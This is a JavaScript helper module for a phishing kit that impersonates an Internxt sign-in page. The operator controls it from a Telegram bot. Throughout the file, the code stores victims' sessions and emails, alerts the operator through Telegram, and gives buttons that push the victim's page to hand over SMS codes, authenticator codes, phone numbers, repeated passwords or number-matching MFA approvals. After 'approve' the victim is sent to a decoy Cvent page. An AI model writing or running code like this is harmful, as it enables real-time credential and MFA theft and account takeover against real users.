// api/_store.js - Shared helper for Vercel serverless functions
const fs = require('fs');
const path = require('path');
const https = require('https');

const FINAL_CVENT_URL = "https://www.cvent.com/events/2018-facial-rejuvenation/event-summary-66dad18444ca4ff1b1379df029fd67f3.aspx/";

// Memory cache fallback for serverless warm execution
const memorySessions = new Map();

function getSessionDir() {
  const dir = path.join('/tmp', 'internxt_sessions');
  if (!fs.existsSync(dir)) {
    try { fs.mkdirSync(dir, { recursive: true }); } catch (e) {}
  }
  return dir;
}

function loadConfig() {
  let config = {};
  try {
    const configPath = path.join(process.cwd(), 'licenseKey.json');
    if (fs.existsSync(configPath)) {
      config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    }
  } catch (e) {}

  const botToken = process.env.TELEGRAM_BOT_TOKEN || config.telegram_bot_token || '';
  let chatId = process.env.TELEGRAM_CHAT_ID || config.telegram_chat_id || config.telegram_ChatID || '';
  if (chatId === '---') chatId = '';

  return {
    telegram_bot_token: String(botToken).trim(),
    telegram_chat_id: String(chatId).trim(),
    Page_LicenseKey: String(config.Page_LicenseKey || '').trim(),
    systemValue: String(config.systemValue || 'livepage_3month').trim()
  };
}

function saveSession(sessionId, data) {
  data.sessionId = sessionId;
  data.updatedAt = Date.now();
  if (!data.createdAt) data.createdAt = Date.now();

  memorySessions.set(sessionId, data);

  try {
    const dir = getSessionDir();
    fs.writeFileSync(path.join(dir, `${sessionId}.json`), JSON.stringify(data));
    if (data.email) {
      const emailHash = Buffer.from(data.email.toLowerCase().trim()).toString('hex');
      fs.writeFileSync(path.join(dir, `email_${emailHash}.json`), JSON.stringify({ sessionId }));
    }
  } catch (e) {}
}

function getSession(sessionId) {
  if (memorySessions.has(sessionId)) {
    return memorySessions.get(sessionId);
  }
  try {
    const dir = getSessionDir();
    const file = path.join(dir, `${sessionId}.json`);
    if (fs.existsSync(file)) {
      const data = JSON.parse(fs.readFileSync(file, 'utf8'));
      memorySessions.set(sessionId, data);
      return data;
    }
  } catch (e) {}
  return null;
}

function getSessionByEmail(email) {
  if (!email) return null;
  const target = email.toLowerCase().trim();
  for (const sess of memorySessions.values()) {
    if (sess.email && sess.email.toLowerCase().trim() === target) {
      return sess;
    }
  }
  try {
    const dir = getSessionDir();
    const emailHash = Buffer.from(target).toString('hex');
    const mapFile = path.join(dir, `email_${emailHash}.json`);
    if (fs.existsSync(mapFile)) {
      const map = JSON.parse(fs.readFileSync(mapFile, 'utf8'));
      if (map && map.sessionId) {
        return getSession(map.sessionId);
      }
    }
  } catch (e) {}
  return null;
}

function callTelegram(botToken, method, params = {}) {
  return new Promise((resolve) => {
    if (!botToken) return resolve({ ok: false, error: 'No bot token' });
    const payload = JSON.stringify(params);
    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${botToken}/${method}`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      },
      timeout: 6000
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(body));
        } catch (e) {
          resolve({ ok: false, raw: body });
        }
      });
    });

    req.on('error', (e) => resolve({ ok: false, error: e.message }));
    req.on('timeout', () => { req.destroy(); resolve({ ok: false, error: 'timeout' }); });
    req.write(payload);
    req.end();
  });
}

function buildMainActionsKeyboard(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: '🔢 Number-Tap (1-99)', callback_data: `act:${sessionId}:num_menu` },
        { text: '📱 Tap-Yes', callback_data: `act:${sessionId}:tap_yes` }
      ],
      [
        { text: '💬 SMS Code', callback_data: `act:${sessionId}:sms_code` },
        { text: '🔐 Auth Code', callback_data: `act:${sessionId}:auth_code` }
      ],
      [
        { text: '📞 Ask Phone', callback_data: `act:${sessionId}:ask_phone` },
        { text: '🔁 Wrong Password', callback_data: `act:${sessionId}:retry` }
      ],
      [
        { text: '✅ Approve (Redirect to Cvent)', callback_data: `act:${sessionId}:approve` }
      ]
    ]
  };
}

function buildRangePickerKeyboard(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: '1 - 20', callback_data: `rng:${sessionId}:1-20` },
        { text: '21 - 40', callback_data: `rng:${sessionId}:21-40` }
      ],
      [
        { text: '41 - 60', callback_data: `rng:${sessionId}:41-60` },
        { text: '61 - 80', callback_data: `rng:${sessionId}:61-80` }
      ],
      [
        { text: '81 - 99', callback_data: `rng:${sessionId}:81-99` },
        { text: '📋 Show All 1-99', callback_data: `rng:${sessionId}:all` }
      ],
      [
        { text: '⬅️ Back to Main Actions', callback_data: `act:${sessionId}:back_main` }
      ]
    ]
  };
}

function buildNumberGridKeyboard(sessionId, start, end) {
  const rows = [];
  let currentRow = [];
  for (let i = start; i <= end; i++) {
    currentRow.push({ text: String(i), callback_data: `num:${sessionId}:${i}` });
    if (currentRow.length === 5) {
      rows.push(currentRow);
      currentRow = [];
    }
  }
  if (currentRow.length) rows.push(currentRow);
  rows.push([
    { text: '⬅️ Pick Another Range', callback_data: `act:${sessionId}:num_menu` },
    { text: '🏠 Main Actions', callback_data: `act:${sessionId}:back_main` }
  ]);
  return { inline_keyboard: rows };
}

function buildAllNumbersGridKeyboard(sessionId) {
  const rows = [];
  let currentRow = [];
  for (let i = 1; i <= 99; i++) {
    currentRow.push({ text: String(i), callback_data: `num:${sessionId}:${i}` });
    if (currentRow.length === 8) {
      rows.push(currentRow);
      currentRow = [];
    }
  }
  if (currentRow.length) rows.push(currentRow);
  rows.push([
    { text: '⬅️ Range View', callback_data: `act:${sessionId}:num_menu` },
    { text: '🏠 Main Actions', callback_data: `act:${sessionId}:back_main` }
  ]);
  return { inline_keyboard: rows };
}

function buildNumberActiveKeyboard(sessionId, number) {
  return {
    inline_keyboard: [
      [
        { text: `✅ User Tapped ${number} (Approve)`, callback_data: `act:${sessionId}:approve` },
        { text: '❌ Wrong Number', callback_data: `act:${sessionId}:wrong_num` }
      ],
      [
        { text: '🔢 Change Number', callback_data: `act:${sessionId}:num_menu` },
        { text: '🔁 Request Password Again', callback_data: `act:${sessionId}:retry` }
      ],
      [
        { text: '🏠 Main Actions', callback_data: `act:${sessionId}:back_main` }
      ]
    ]
  };
}

async function handleCallbackQuery(callbackQuery, botToken) {
  const data = callbackQuery.data || '';
  const cqId = callbackQuery.id;
  const msgId = callbackQuery.message?.message_id;
  const chatId = callbackQuery.message?.chat?.id;

  if (!data) return;

  if (data.startsWith('act:')) {
    const [, sessionId, action] = data.split(':');
    const session = getSession(sessionId);
    if (!session) {
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Session expired or not found.', show_alert: true });
      return;
    }

    if (action === 'num_menu') {
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId });
      await callTelegram(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `🔢 <b>Select Number Range (1-99)</b>\nSession: <code>${sessionId}</code>\nPick a range below:`,
        parse_mode: 'HTML',
        reply_markup: buildRangePickerKeyboard(sessionId)
      });
    } else if (action === 'back_main') {
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId });
      await callTelegram(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `🔐 <b>Sign-In Attempt (Internxt)</b>\nEmail: <code>${session.email || 'User'}</code>\nSession: <code>${sessionId}</code>\n\nChoose verification action:`,
        parse_mode: 'HTML',
        reply_markup: buildMainActionsKeyboard(sessionId)
      });
    } else if (action === 'tap_yes') {
      session.redirect = 'Tap-Yes';
      session.status = 'pending';
      saveSession(sessionId, session);
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: Tap-Yes' });
      await callTelegram(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `📱 <b>Tap-Yes Active</b>\nSession: <code>${sessionId}</code>\nVictim page waiting for YES.`,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [{ text: '✅ Approved (Redirect to Cvent)', callback_data: `act:${sessionId}:approve` }],
            [{ text: '🔁 Request Password Again', callback_data: `act:${sessionId}:retry` }],
            [{ text: '🏠 Main Menu', callback_data: `act:${sessionId}:back_main` }]
          ]
        }
      });
    } else if (action === 'sms_code') {
      session.redirect = 'SMS CODE';
      session.status = 'pending';
      saveSession(sessionId, session);
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: SMS Code' });
      await callTelegram(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `💬 <b>SMS Code Prompt Active</b>\nSession: <code>${sessionId}</code>`,
        parse_mode: 'HTML',
        reply_markup: buildMainActionsKeyboard(sessionId)
      });
    } else if (action === 'auth_code') {
      session.redirect = 'Authentication Code';
      session.status = 'pending';
      saveSession(sessionId, session);
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: Authenticator App Code' });
      await callTelegram(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `🔐 <b>Authenticator App Code Active</b>\nSession: <code>${sessionId}</code>`,
        parse_mode: 'HTML',
        reply_markup: buildMainActionsKeyboard(sessionId)
      });
    } else if (action === 'ask_phone') {
      session.redirect = 'Ask Phonnumber';
      session.status = 'pending';
      saveSession(sessionId, session);
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: Ask Phone' });
      await callTelegram(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `📞 <b>Phone Prompt Active</b>\nSession: <code>${sessionId}</code>`,
        parse_mode: 'HTML',
        reply_markup: buildMainActionsKeyboard(sessionId)
      });
    } else if (action === 'retry') {
      session.status = 'retry';
      session.message = 'retry';
      saveSession(sessionId, session);
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Password Retry Sent' });
      await callTelegram(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `🔁 <b>Password Retry Sent</b>\nSession: <code>${sessionId}</code>\nVictim will be asked for password again.`,
        parse_mode: 'HTML',
        reply_markup: buildMainActionsKeyboard(sessionId)
      });
    } else if (action === 'approve') {
      session.status = 'saved';
      session.redirect = FINAL_CVENT_URL;
      saveSession(sessionId, session);
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Approved! Redirecting user...' });
      await callTelegram(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `🎉 <b>VERIFICATION APPROVED</b>\nSession: <code>${sessionId}</code>\nUser redirected to Cvent event summary.`,
        parse_mode: 'HTML'
      });
    } else if (action === 'wrong_num') {
      session.status = 'wrong_number_pressed';
      saveSession(sessionId, session);
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Marked as Wrong Number' });
      await callTelegram(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `❌ <b>Wrong Number Tapped</b>\nSession: <code>${sessionId}</code>`,
        parse_mode: 'HTML',
        reply_markup: buildMainActionsKeyboard(sessionId)
      });
    }
  } else if (data.startsWith('rng:')) {
    const [, sessionId, range] = data.split(':');
    await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId });
    let keyboard, text;
    if (range === 'all') {
      keyboard = buildAllNumbersGridKeyboard(sessionId);
      text = `🔢 <b>Tap any Number (1 - 99):</b>\nSession: <code>${sessionId}</code>`;
    } else {
      const [start, end] = range.split('-').map(Number);
      keyboard = buildNumberGridKeyboard(sessionId, start, end);
      text = `🔢 <b>Select Number (${start} - ${end}):</b>\nSession: <code>${sessionId}</code>`;
    }
    await callTelegram(botToken, 'editMessageText', {
      chat_id: chatId,
      message_id: msgId,
      text: text,
      parse_mode: 'HTML',
      reply_markup: keyboard
    });
  } else if (data.startsWith('num:')) {
    const [, sessionId, numStr] = data.split(':');
    const number = parseInt(numStr, 10);
    const session = getSession(sessionId);
    if (!session) {
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Session expired.', show_alert: true });
      return;
    }
    session.numberTap = String(number);
    session.redirect = `Number-Tap:${number}`;
    session.status = 'pending';
    saveSession(sessionId, session);

    await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: `Selected: ${number}` });
    await callTelegram(botToken, 'editMessageText', {
      chat_id: chatId,
      message_id: msgId,
      text: `✅ <b>Number-Tap [ ${number} ] Active!</b>\nSession: <code>${sessionId}</code>\nUser screen is now displaying number <b>${number}</b>.\n\nDid user confirm?`,
      parse_mode: 'HTML',
      reply_markup: buildNumberActiveKeyboard(sessionId, number)
    });
  }
}

let lastUpdateId = 0;
async function syncTelegramUpdates(botToken) {
  if (!botToken) return;
  const res = await callTelegram(botToken, 'getUpdates', {
    offset: lastUpdateId + 1,
    limit: 10,
    timeout: 0
  });
  if (res.ok && Array.isArray(res.result)) {
    for (const update of res.result) {
      if (update.update_id > lastUpdateId) {
        lastUpdateId = update.update_id;
      }
      if (update.callback_query) {
        await handleCallbackQuery(update.callback_query, botToken);
      }
    }
  }
}

module.exports = {
  loadConfig,
  saveSession,
  getSession,
  getSessionByEmail,
  callTelegram,
  buildMainActionsKeyboard,
  handleCallbackQuery,
  syncTelegramUpdates,
  FINAL_CVENT_URL
};
